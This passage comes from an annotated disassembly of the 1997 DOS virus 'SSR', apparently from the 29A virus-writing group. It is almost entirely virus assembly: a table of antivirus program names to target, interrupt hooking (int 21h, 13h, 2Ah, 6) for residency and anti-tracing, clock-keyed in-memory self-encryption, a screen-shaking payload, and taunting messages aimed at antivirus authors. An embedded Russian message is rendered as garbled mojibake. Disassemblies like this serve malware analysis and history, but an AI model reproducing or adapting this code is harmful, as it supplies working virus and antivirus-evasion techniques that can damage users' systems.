                   db      'STM'   ; ???
                   db      'MOD'   ; MOD song format
                   db      'CPP'   ; C++ sources
                   db      'DOT'   ; WinWord
                   db      0FFh    ; End of table ÿ

   av_table:
                   db      'DR'    ; DRWEB
                   db      'AI'    ; AIDSTEST
                   db      'AD'    ; ADINF
                   db      'CO'    ; COMMAND.COM
                   db      'HI'    ; HIEW
                   db      'AV'    ; AVP, AVSCAN     <ÄÄÄÄÄÄÄÄÄÄÄ¿
                   db      'WI'    ; WIN                         ³
                   db      'KE'    ; KEYB                        ³
                   db      'US'    ; USER.EXE (Windows file)     ³
                   db      'GD'    ; GDI.EXE (Windows file)      ³
                   db      'AV'    ; Already checked!!! ÄÄÄÄÄÄÄÄÄÙ
                   db      '##'    ; End of table

                   db      0       ; Unused!

   db      0Dh,0Ah
   db      '* yâ¨ëç !'
   db      0Ah,0Dh
   db      '*¥p¥¨¬¥®¢ âì ¥ § å®â¥«,¤  ! ’ë á ¬ íâ®£® å®â¥« ! '
   db      0Dh,0Ah
   db      '*â® ¢®©  !!! ‘ ç «  ¤®ª¨  yç¨áì ¯¨á âì (á¬ AVPVE)!'
   db      0Dh,0Ah
   db      '‚ ®¡é¥¬,H…‚Ž‡ŒŽ†HŽ‘’œ ‹…—…HˆŸ ®áâ ¢«ï¥â £¥âãé¥¥  ¢¯¥ç â«¥¨¥'
   db      0Ah,0Dh
   db      '®â çà¥§¬¥àëå ¯®âã£ £®á¯®¤¨  ¢¨à«¨áâ®¯¨á â¥«ï...'
   db      0Dh,0Ah
   db      'Exe-Pklite â®«ìª® ¢ 3.13  ª®¯ «...*¥¤ë¥ î§¥pë  ¢¥p®¥'
   db      0Dh,0Ah
   db      'â¥¡ï § ¤®«¡ «¨,  ? Š ª íâ®:¢á¥ “„€‹ˆ‹:),  ® ®¯ïâì ¯®ï¢¨«áï !'
   db      0Dh,0Ah
   db      'H“ ’…*…*œ ‚‘… - ‚€Œ ‚‘…Œ Œ…HŸ ’…*…*œ ‹…—ˆ’œ ‘‹€*Ž:SND ®¤ ª®...'
   db      0Dh,0Ah
   db      'RES ¥ ®âí¬y«¨« - ¯®«yç¨ 32ReGs,@$%^, !'
   db      0Dh,0Ah
   db      'Revenge - *â® ¤ ¦¥ ¥ è¢ ¡p ,  ¯ë«¥á®á á ï¤¥p®©  ª çª®© ¨'
   db      0Dh,0Ah
   db      'âyp¡®- ¤¤y¢®¬ ¤«ï â¢®¥© ¥áç áâ®© * yâ¨ë ¨ ®áâ «ìëå ‡€SHITHˆŠŽ‚!'
   db      0Dh,0Ah
   db      '[®áâ «ìë¥  ¥§¤ë ¯®áª¨¯ ë]'
   db      0Dh,0Ah
   db      '“¢ ¦ ¥¬ë© £- Š á¯¥páª¨© ! Žç¥ì ¡« £®¤ p¥ §  ¯®¤p®¡®¥ ®¯¨á ¨¥ !'
   db      0Dh,0Ah
   db      'Œ¥ ®ç¥ì ¯®p ¢¨«®áì,thanks.* £¨ ¢ ¤®ª¥ ¥áâì ® ¢á¥ p ¢® - Š*“’Ž !'
   db      0Dh,0Ah
   db      'RES - ¥ ¯®«¨¬®päë© £¥¥p â®p,  Randomer'
   db      0Dh,0Ah
   db      '*® íâ®¬y ¯®¢®¤y ï y¤ «¨« .AVB ¨§ å®p®è¥£® á¯¨áª  ! Best®¢ë¥ p¥£ p¤ë ¨'
   db      0Dh,0Ah
   db      'py«¥áë !  AVP - íâ® ªpyâ®,Web - real SUXX !'
   db      0Dh,0Ah
   db      '‡  ¡ £¨ ¨ £«îª¨ ¥ ®â¢¥ç î (¢ ®á®¡¥®áâ¨ §  çy¦¨¥)!'
   db      0Dh,0Ah
   db      'ü S.S.R.'
   db      0Dh,0Ah
   db      'P.S. remember:8086 - ¥ 486,  emul - ¥ TD386'
   db      0Dh,0Ah


   encrypt_instructions:
                   add     es:[di],al
                   sub     es:[di],al
                   xor     es:[di],al
                   ror     byte ptr es:[di],cl

   int_24:
                   mov     al,3
                   iret

   int_1c:
                   pushf
                   inc     cs:tick_counter-100h
                   cmp     cs:tick_counter-100h,6000h      ; Time to shake screen?
                                                   ; (6000h ticks = aprox. 22 min.)
                   je      shake_screen            ; Yes? then jmp
           nop
           nop
           nop
           popf
           iret

   shake_screen:
                   dec     cs:tick_counter-100h    ; Continue with shake
           push    ax
           push    dx
                   mov     dx,3C4h
                   mov     al,1
                   out     dx,al   ; EGA: sequencer address reg
                                   ; clocking mode. Data bits:
                                   ; 0: 1=8 dots/char; 0=9 dots/char
                                   ; 1: CRT bandwidth: 1=low; 0=high
                                   ; 2: 1=shift every char; 0=every 2nd char
                                   ; 3: dot clock: 1=halved
           inc dx
                   in      al,40h  ; Get random number
                   and     al,1    ; AL:=[0 | 1]
                   out     dx,al   ; EGA port: sequencer data register
                                   ; Shake screen
           pop dx
           pop ax
           popf
           iret

   tick_counter    dw      0

   int_6:
                   pop     cs:caller_IP-100h
                   pop     cs:caller_CS-100h
                   push    cs:caller_CS-100h
                   push    cs:caller_IP-100h
           push    es
           push    ax
           push    di
                   mov     ax,cs:caller_CS-100h
                   mov     es,ax
                   mov     di,cs:caller_IP-100h
                   cmp     byte ptr es:[di],0F0h   ; Opcode 0F0? (Used by SND)
                   jne     exit_i6                 ; No? then jmp
           nop
           nop
           nop
                   mov     al,es:[di+1]            ; Get next byte
                   rcr     al,1                    ; Using AX?
                   jc      encode_movax            ; Yes? then jmp
           nop
           nop
           nop
                   mov     byte ptr es:[di],0B4h   ; Encode MOV AH,xx
                   mov     al,es:[di+3]            ; Get value of AH
                   xor     al,es:[di+2]            ; Decrypt it
                   mov     es:[di+1],al            ; and store it
                   mov     es:[di+2],21CDh         ; Encode int 21h
                   jmp     exit_i6
           nop

   encode_movax:
                   mov     byte ptr es:[di],0B8h   ; Encode MOV AX,xxxx
                   mov     ax,es:[di+3]            ; Get value of AX
                   xor     al,es:[di+2]            ; Decrypt it
                   xor     ah,es:[di+2]
                   mov     es:[di+1],ax            ; and store it
                   mov     es:[di+3],21CDh         ; Encode int 21h
                   jmp     exit_i6                 ; Stupid JMP!!
           nop
   exit_i6:
           pop di
           pop ax
           pop es
           iret

   caller_IP       dw      0
   caller_CS       dw      0

   int_ac:
                   add     sp,6            ; Remove return address from stack
           pushf
           push    ax
           push    bx
           push    es
                   mov     bx,cs:ofs_i21_2-100h    ; Get real int 21h
                   mov     ax,cs:seg_i21_2-100h
                   mov     es,ax
                   mov     ax,cs:_2bytes_21h-100h
                   mov     es:[bx],ax              ; Restore original bytes
           pop es
           pop bx
           pop ax
           push    si
           push    cx
           push    ax
                   mov     si,offset(function_table)-100h
                   mov     cx,3
   l_cmp_function:
                   cmp     ah,cs:[si]      ; Function in table?
                   je      found_function  ; Yes? then jmp
           nop
           nop
           nop
           inc si
                   loop    l_cmp_function
           dec ah
                   cmp     ax,4A00h        ; 4B00h? Exec?
                   je      found_function  ; Yes? then jmp
           nop
           nop
           nop
                   cmp     ah,0FEh         ; 0FFh?
                   jne     cmp_abcd        ; No? then jmp
                   jmp     warning_msg     ; Yes? then jmp

   cmp_abcd:
                   cmp     ax,0AACDh       ; 0ABCDh?
                   jne     cmp_4b53        ; No? then jmp
                   jmp     warning_msg     ; Yes? then jmp

   cmp_4b53:
                   cmp     ax,4A53h        ; 4B53h?
                   jne     cmp_cccc        ; No? then jmp
                   jmp     warning_msg     ; Yes? then jmp

   cmp_cccc:
                   cmp     ax,0CBCCh       ; 0CCCCh?
                   jne     cmp_dead        ; No? then jmp
                   jmp     warning_msg     ; Yes? then jmp

   cmp_dead:
                   cmp     ax,0DDADh       ; 0DEADh?
                   jne     exec_21h        ; No? then jmp
                   jmp     warning_msg     ; Yes? then jmp

   exec_21h:
           pop ax
           pop cx
           pop si
           popf
                   jmp     jmp_21h
           nop

   function_table:
                   db      3Dh     ; Open
                   db      4Eh     ; Find-first
                   db      4Fh     ; Find-next

   found_function:
           pop ax
           pop cx
           pop si
           popf
                   call    decrypt_memory
                   call    set_original_i13h
                   int     0ABh
                   call    encrypt_memory
                   call    restore_i13h
                   jmp     jmp_21h
           nop

   exit_21h:
                   call    restore_i13h
                   call    encrypt_memory
           pushf
           push    es
           push    ax
           push    bx
                   mov     bx,cs:ofs_i21_2-100h
                   mov     ax,cs:seg_i21_2-100h
                   mov     es,ax
                   mov     es:[bx],0ACCDh  ; int ACh in starting bytes of int 21h
           pop bx
           pop ax
           pop es
           popf
           retf    2

   jmp_21h:
           pushf
                   pop     cs:flags-100h           ; Save flags
           push    es
           push    bx
           push    ax
                   xor     bx,bx
                   mov     es,bx                   ; ES:=0
                   mov     bx,es:[2Ah*4]           ; Get & save int 2Ah
                   mov     cs:ofs_i2A_2-100h,bx
                   mov     bx,es:[2Ah*4+2]
                   mov     cs:seg_i2A_2-100h,bx
                   mov     es:[2Ah*4],offset(int_2A_2)-100h   ; Set new int 2Ah
                   mov     es:[2Ah*4+2],cs
           pop ax
           pop bx
           pop es
           push    cs
                   mov     cs:saved_AX-100h,ax
                   mov     ax,offset(return_from_int)-100h ; Return address
           push    ax
                   mov     cs:saved_DI-100h,di
                   mov     cs:saved_ES-100h,es
                   push    cs:flags-100h
                   mov     di,70h                  ; DOS Segment
                   mov     es,di
           push    es
                   xor     di,di
   l_search_retf:                                  ; Search for a RETF in DOS seg
                   cmp     byte ptr es:[di],0CBh   ; RETF?
                   je      found_retf              ; Yes? then jmp
           nop
           nop
           nop
           inc di
                   jmp     l_search_retf

   found_retf:
                   push    di              ; The int will return to a RETF in the
                                           ;  DOS segment -> It simulates that the
                                           ;  call to the int was done by DOS
                   mov     di,cs:saved_ES-100h     ; Restore registers
                   mov     es,di
                   mov     di,cs:saved_DI-100h
                   mov     ax,cs:saved_AX-100h
                   db      0EAh                    ; jmp far (exec int 21h)
   ofs_i21_2       dw      0
   seg_i21_2       dw      0


   return_from_int:
                   call    restore_i2A_2
                   jmp     int_2A_2
                   nop

   restore_i2A_2:
           pushf
           push    es
           push    bx
                   xor     bx,bx
                   mov     es,bx                   ; ES:=0
                   mov     bx,cs:ofs_i2A_2-100h    ; Restore int 2Ah
                   mov     es:[2Ah*4],bx
                   mov     bx,cs:seg_i2A_2-100h
                   mov     es:[2Ah*4+2],bx
           pop bx
           pop es
           popf
           ret

   int_2A_2:                       ; Int 2Ah: Called at the end of an int 21h
           nop
           nop
           pushf
           push    es
           push    ax
           push    bx
                   mov     bx,cs:ofs_i21_2-100h
                   mov     ax,cs:seg_i21_2-100h
                   mov     es,ax
                   mov     es:[bx],0ACCDh  ; int 0ACh in starting bytes of int 21h
           pop bx
           pop ax
           pop es
           popf
                   call    restore_i2A_2
           retf    2

   _2bytes_21h     dw      0
   ofs_i2A_2       dw      0
   seg_i2A_2       dw      0
   saved_AX        dw      0
   saved_DI        dw      0
   saved_ES        dw      0
   flags           dw      0

   encrypt_memory:
                   pushf
           push    es
           push    si
           push    cx
           push    ax
                   xor     si,si
                   mov     ax,40h
                   mov     es,ax
                   mov     cl,es:[6Ch]     ; Get random number (clock)
                   mov     cs:mem_mask-100h,cl
                   mov     al,cl
                   mov     cx,int_24-virus_start
   l_encrypt_memory:
           push    cx
                   mov     cl,al
                   add     cs:[si],cl      ; Encrypt code in memory
                   ror     byte ptr cs:[si],cl
                   xor     cs:[si],cl
           inc si
           pop cx
                   loop    l_encrypt_memory
           pop ax
           pop cx
           pop si
           pop es
           popf
           ret

   decrypt_memory:
           pushf
           push    si
           push    cx
           push    ax
                   xor     si,si
                   mov     cx,int_24-virus_start
   l_decrypt_memcode:
           push    cx
   mem_mask        equ     byte ptr $+1
                   mov     cl,0                    ; mov cl,mem_mask
                   xor     cs:[si],cl              ; Decrypt code in memory
                   rol     byte ptr cs:[si],cl
                   sub     cs:[si],cl
           inc si
           pop cx
                   loop    l_decrypt_memcode
           pop ax
           pop cx
           pop si
           popf
           ret

   int_21:
           pushf
                   db      9Ah     ; call far
   ofs_i21         dw      0
   seg_i21         dw      0
           ret


                   iret            ; Unused!

   set_original_i13h:
           pushf
           push    ax
           push    es
                   xor     ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     ax,es:[13h*4]           ; Get int 13h
                   mov     cs:ofs_actual_i13-100h,ax    ; Save it
                   mov     ax,es:[13h*4+2]
                   mov     cs:seg_actual_i13-100h,ax
                   mov     ax,cs:ofs_i13-100h
                   mov     es:[13h*4],ax           ; Set original int 13h
                   mov     ax,cs:seg_i13-100h
                   mov     es:[13h*4+2],ax
           pop es
           pop ax
           popf
           ret

   restore_i13h:
           pushf
           push    ax
           push    es
                   xor     ax,ax
                   mov     es,ax                           ; ES:=0
                   mov     ax,cs:ofs_actual_i13-100h       ; Restore int 13h
                   mov     es:[13h*4],ax
                   mov     ax,cs:seg_actual_i13-100h
                   mov     es:[13h*4+2],ax
           pop es
           pop ax
           popf
                   ret

   ofs_i13         dw      0
   seg_i13         dw      0
   ofs_actual_i13  dw      0
   seg_actual_i13  dw      0

   warning_msg:
                   mov     ax,0B800h
                   mov     es,ax           ; ES:=0B800 (text video segment)
                   mov     di,(6*80+15)*2  ; gotoxy(15,6)
                   mov     si,offset(msg_alarm)-100h
                   mov     cx,14           ; Number of msgs
   l_next_msg:
           push    di
                   xor     bp,bp
   l_msg_nextchar:
           inc bp
                   mov     al,cs:[si]
                   cmp     al,0            ; End of string?
                   jz      msg_end         ; Yes? then jmp
           nop
           nop
           nop
                   mov     ah,15           ; Textcolor=white
                   stosw                   ; Put character on screen
           inc si
                   jmp     l_msg_nextchar

   msg_end:
           inc si
           push    cx
                   shl     bp,1
                   mov     cx,(80+15)*2
                   sub     cx,bp
                   mov     ax,0F20h
           cld
                   rep     stosw           ; Fill line with spaces
           pop cx
           pop di
                   add     di,80*2         ; Next line
                   loop    l_next_msg
                   xor     cx,cx
                   mov     bx,cx
                   mov     ax,1010h
                   xor     dx,dx
   l_change_colors:
           push    di
           push    bx
                   mov     di,0C8h
                   mov     bx,0Ah
                   call    sound
           pop bx
           pop di
                   int     10h             ; AX=1010h : Set individual DAC regs.
                                           ; BX=0 -> Color 0
                   inc     dh              ; Inc value for red
           push    di
           push    bx
                   mov     dl,dh
                   and     dl,0Fh
                   cmp     dl,1
                   jne     loop_change_colors
           nop
           nop
           nop
                   mov     di,12Ch
                   mov     bx,12Ch
                   call    sound
                   jmp     loop_change_colors

                   nop                     ; Unused code !
                   mov     di,3E8h         ;
                   mov     bx,12Ch         ;
                   call    sound           ;
   loop_change_colors:
           pop bx
           pop di
                   jmp     l_change_colors

   sound:
           push    ax
           push    bx
           push    cx
           push    dx
           push    di
                   mov     al,0B6h
                   out     43h,al          ; Get the timer ready
                   mov     dx,14h
                   mov     ax,4F38h
           div di
                   out     42h,al          ; Send frecuency to timer
                   mov     al,ah
                   out     42h,al
                   in      al,61h          ; PC/XT PPI port B bits:
                       ; 0: Tmr 2 gate ÍËÍ OR 03H=spkr ON
                       ; 1: Tmr 2 data Í¼  AND 0fcH=spkr OFF
                   mov     ah,al
                   or      al,3            ; Speaker ON
                   out     61h,al
   l_loop_sound2:
                   mov     cx,0AF1h
   l_loop_sound1:
                   loop    l_loop_sound1
           dec bx
                   jnz     l_loop_sound2
                   mov     al,ah           ; Set Speaker to previous state
                   out     61h,al          ; PC/XT PPI port B bits:
                       ; 0: Tmr 2 gate ÍËÍ OR 03H=spkr ON
                       ; 1: Tmr 2 data Í¼  AND 0fcH=spkr OFF
           pop di
           pop dx
           pop cx
           pop bx
           pop ax
           ret

                   iret                    ; Unused!

                   db      0               ; Unused!

   msg_alarm       db      '     !!! ALARM WARNING DANGER APPROACHING !!!',0
                   db      ' Hacker-fucker TSR shit or Any Virus Detected !!!',0
                   db      '  Anyone who wants to fuck Revenge is Naivnij Man',0
                   db      '      With best Wishes to E.Kaspersky !',0
                   db      ' Now I''m CURELESS !!! SND Used !!! Rules !!!',0
                   db      'In future versions I will add :',0
                   db      ' 1. Protected Mode Decryptor [SF0rCE]',0
                   db      '    (Web,try to emul IT :)))) )',0
                   db      ' 2. UniversalAntiDetector',0
                   db      ' 3. Must Die: Lamers,Webs & other...',0
                   db      ' 4. And other BUGs,GLUKs & SHITs !',0
                   db      'Dis is Continue... Win95 & her lamers must die!',0
                   db      '         Searching... SEEK & DESTROY',0
                   db      '          There can be only one ...',0

                   db      0Ah,0Dh,'--------------------'
                   db      0Ah,0Dh,'--------------------'
                   db      0Ah,0Dh,'Orign:NUkE HiM A11 !',0

                   db      'BIG NAWOROT',0
                   db      'BUGS INSIDE <tm> ',0

   virus_end:

   SSR     ends

   extrn   res_engine:near
   extrn   ssrme_engine:near
   extrn   mme_engine:near

                   end     host

   ; End of SSR disasm
   ; (c) 1997, Tcp/29A (tcp@cryogen.com)
   ;
